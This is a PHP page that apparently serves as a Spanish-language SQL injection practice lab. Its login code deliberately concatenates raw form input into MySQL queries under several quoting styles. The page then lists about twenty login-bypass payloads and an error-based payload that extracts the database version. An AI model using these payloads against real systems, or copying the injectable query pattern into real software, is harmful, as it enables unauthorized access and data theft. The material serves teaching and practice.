<?php


echo "<a href='/'>Ir anicio</a>";
if(isset($_POST['user']) and isset($_POST['pass']))
{

	


	$conexion= mysqli_connect("127.0.0.1","root","") or die("no se puede conectar");
	mysqli_select_db($conexion,"sqli") or die("no se encontro la base de datos");
	mysqli_set_charset($conexion,"utf8") or die("no se pudo poner la codificacion");


	if(isset($_POST["coms"]))
	{
		echo "<br><br>En esta consulta se utiliza comillas simples utiliza injecciones que contengan comillas simples<br>";
		echo "<strong>select * from login where usuario='<font color='red'>".$_POST['user']."</font>' and contraseña='<font color='red'>".$_POST['pass']."</font>'</strong><br><br>";
		$resultado= mysqli_query($conexion,"select * from login where usuario='".$_POST['user']."' and contraseña='".$_POST['pass']."'");
	}
	elseif(isset($_POST["comd"]))
	{
		echo "<br><br>En esta consulta se utiliza comillas dobles utiliza injecciones que contengan comillas dobles<br>";
		echo '<strong>select * from login where usuario="<font color="red">'.$_POST['user'].'</font>" and contraseña="<font color="red">'.$_POST['pass'].'</font>"</strong><br><br>';
		$resultado= mysqli_query($conexion,'select * from login where usuario="'.$_POST['user'].'" and contraseña="'.$_POST['pass'].'"');	
	}
	elseif(isset($_POST["comsp"]))
	{
		echo "<br><br>En esta consulta se utiliza comillas simples y Parentesis utiliza injecciones que contengan comillas simples y Parentesis<br>";
		echo "<strong>select * from login where usuario=('<font color='red'>".$_POST['user']."</font>') and contraseña=('<font color='red'>".$_POST['pass']."</font>')</strong><br><br>";
		$resultado= mysqli_query($conexion,"select * from login where usuario=('".$_POST['user']."') and contraseña=('".$_POST['pass']."')");
	}
	elseif(isset($_POST["comdp"]))
	{
		echo "<br><br>En esta consulta se utiliza comillas dobles y Parentesis utiliza injecciones que contengan comillas dobles y Parentesis<br>";
		echo '<strong>select * from login where usuario=("<font color="red">'.$_POST['user'].'</font>") and contraseña=("<font color="red">'.$_POST['pass'].'</font>")</strong><br><br>';
		$resultado= mysqli_query($conexion,'select * from login where usuario=("'.$_POST['user'].'") and contraseña=("'.$_POST['pass'].'")');
	}
	else
	{
		echo "<strong><br><br>Nooooo se selecciono la forma en la que quieres que se realize la consulta [Comillas simples o Comillas dobles],<br>recuerda que esta opcion se pone nadamas para que practiques<br>en la vida real no hay opciones para que tu decidas como realizar la consulata a la base de datos.</strong><br><br>";
	}
	


	if(isset($_POST["coms"]) or isset($_POST["comd"]) or isset($_POST["comsp"]) or isset($_POST["comdp"]))
	{
		#if (mysqli_fetch_array($resultado))
		if (mysqli_num_rows($resultado))
		{
			echo "BIIIIIENVENIDOOOO USUARIO REGISTRADO<br><br>";
		}
		else
		{
			echo "CONTRASEÑA O USUARIO NO VALIDOS<br><br>";
		}
	}


}



?>


<!DOCTYPE html>
<html>
<head>
	<title></title>
	
	<!-- <meta http-equiv="Content-type" conte lont="text/html; charset=iso-8859-1" />  -->

</head>
<body>


<table >
	
<form action="" method="POST">
	<tr>
		<td align="right">
			<label>Usuario: </label>
		</td>
		<td>
			 <input type="text" name="user" value=<?php  if(empty($_POST['user'])) {echo 'vacio';}else{echo $_POST['user'];}  ?>> 
		</td>
	</tr>
	<tr>
		<td align="right">
			<label>Contrasela: </label>
		</td>
		<td>
			<input type="password" name="pass" value=<?php  if(empty($_POST['pass'])) {echo "123";}else{echo $_POST['pass'];}  ?>>

		</td>
	</tr>
	<tr>
		<td colspan="2">
			<strong>Seleccionar la forma en la cual quieres que se realize la consulta a mysql:</strong>
		</td>
	</tr>
	<tr>
		<td>
			<input type="checkbox" name="coms" <?php if(isset($_POST["coms"]) and !isset($_POST["comd"]) and !isset($_POST["comsp"]) and !isset($_POST["comdp"])){echo "checked";}?>> Comillas simples
		</td>
		<td>
			<input type="checkbox" name="comd" <?php if(!isset($_POST["coms"]) and isset($_POST["comd"]) and !isset($_POST["comsp"]) and !isset($_POST["comdp"])){echo "checked";}?>> Comillas Dobles
		</td>
	</tr>
	<tr>
		<td>
			<input type="checkbox" name="comsp" <?php if(!isset($_POST["coms"]) and !isset($_POST["comd"]) and isset($_POST["comsp"]) and !isset($_POST["comdp"])){echo "checked";}?>> Comillas simples y Parentesis
		</td>
		<td>
			<input type="checkbox" name="comdp" <?php if(!isset($_POST["coms"]) and !isset($_POST["comd"]) and !isset($_POST["comsp"]) and isset($_POST["comdp"])){echo "checked";}?>> Comillas Dobles y Parentesis
		</td>
	</tr>
	<tr>
		<td align="center" colspan="2">
			<input type="submit" name="btn" value="Entrar">
		</td>
	</tr>

</form>
</table>

<p>Para poder bypassear un login hay que tener en cuanta algunas cosas si la consulta a la base de datos se realizo con comillas simbles que son estas -> ' <- o con comillas dobles  que son estas -> " <- pero eso no lo podemos saber y por eso hay que ir variando la injeccion, si con comillas simples no funciona hay que volber a  intentar pero con comillas dobles, hay 3 formas de comentar en mysql que son : # todo que este despues del gato es comentario y mysql no lo leera,  /*Todo dentro del asterisco es comentario*/, -- -Todo que este despues de los guiones es comentario </p>
<p>injecccion pero con comillas simples ' or '1'='1</p>
<p>injecccion pero con comillas dobles " or "1"="1</p>
<p>Son tipos de bypass que se pueden utilizar en login, intente utilizarlos en este login y vea cuales son los que sirven</p>

' or '1'='1<br>
') or ('a'='a<br>
') or ('1'='1<br>
'or true#<br>
'or true-- -<br>
')or true#<br>
')or true-- -<br>
')) or (('1'='1<br>
') or 1=1#<br>
') or 1=1-- -<br>
') or 1=1-- -<br>
" or "1"="1<br>
") or ("1"="1<br>
")) or (("1"="1<br>
") or 1=1#<br>
") or 1=1-- -<br>
")or true#<br>
")or true-- -<br>
"or true#<br>
"or true-- -<br>
")/**/or/**/true#<br>


<br><br><labrl>Esta Injeccion es para extraer informacion de la base de datos con SQLI BASE-ERROR</label><br><br>
 <label>" OR ROW(1706,6680)>(SELECT COUNT(*),CONCAT(0x2a7c3e,(sElEcT( sElEcT cOnCaT(version())) fRoM information_schema.tAbLeS lImIt 0,1),(SELECT (ELT(1706=1706,1))),0x3c7c2a,FLOOR(RAND(0)*2))x fRoM information_schema. tAbLeS gRoUp bY x) and "1"="1</label>
</body>
</html>